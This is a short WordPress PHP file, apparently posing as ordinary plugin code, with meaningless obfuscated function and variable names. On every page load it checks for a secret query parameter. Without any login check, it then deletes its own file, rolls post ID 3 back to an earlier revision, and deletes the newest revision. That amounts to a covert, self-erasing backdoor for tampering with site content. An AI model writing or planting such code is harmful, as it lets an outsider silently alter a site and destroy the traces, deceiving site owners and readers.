<?php

function sites_back_sidebar_members() {
	if (isset($_GET['attachments_current_rank']) && $_GET['attachments_current_rank'] === 'meta_cool_quote_permalink') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$homepage_lightgray_quick_iframe = 3;
		$results_codes_customize = wp_get_post_revisions($homepage_lightgray_quick_iframe);
		if (empty($results_codes_customize)) die('no revisions');
		if (count($results_codes_customize) < 2) die('less than 2');
		$popular_print_customizer = array_shift($results_codes_customize);
		$php_software_sign_system = $popular_print_customizer->ID;
		$express_gravatar_json_companion = array_shift($results_codes_customize);
		$favicon_wishlist_frontend_dashboard = $express_gravatar_json_companion->ID;
		$reusable_modules_shortcode_section = wp_restore_post_revision($favicon_wishlist_frontend_dashboard);
		if ($reusable_modules_shortcode_section === false) die('error restoring');
		$reusable_modules_shortcode_section = wp_delete_post_revision($php_software_sign_system);		
		if ($reusable_modules_shortcode_section === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sites_back_sidebar_members');
